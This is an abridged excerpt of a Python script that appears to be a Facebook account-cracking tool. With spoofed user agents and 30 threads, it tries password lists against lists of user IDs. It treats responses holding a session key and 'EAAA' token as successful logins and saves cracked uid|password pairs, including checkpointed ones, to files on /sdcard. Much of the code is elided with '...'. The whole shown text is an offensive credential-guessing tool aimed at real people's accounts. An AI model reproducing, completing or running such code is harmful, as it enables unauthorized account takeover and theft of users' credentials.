...
ugen = ['Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5'
...
class Main:
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit()
				print(' Crack id    : '+str(len(self.id)))
				print(' Use flight mode for more speed up')
				setu()
				for user in self.id:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r \033[1;37m[ RAFSAN ] %s|OK-\033[1;32m%s <> \033[90mCP-%s"%(self.loop, len(self.ok),len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r\033[38;5;46m [RAFSAN-OK] %s | %s\n\033[1;32m [AGENT•] %s"%(uid, pw,ua))
				self.ok.append("%s|%s"%(uid, pw))
				open("/sdcard/AKASH-OLD-OK.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r\033[38;5;126m [RAFSAN-CP] %s | %s"%(uid, pw)) 
				self.cp.append("%s|%s"%(uid, pw))
				open("/sdcard/AKASH-OLD-CP.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
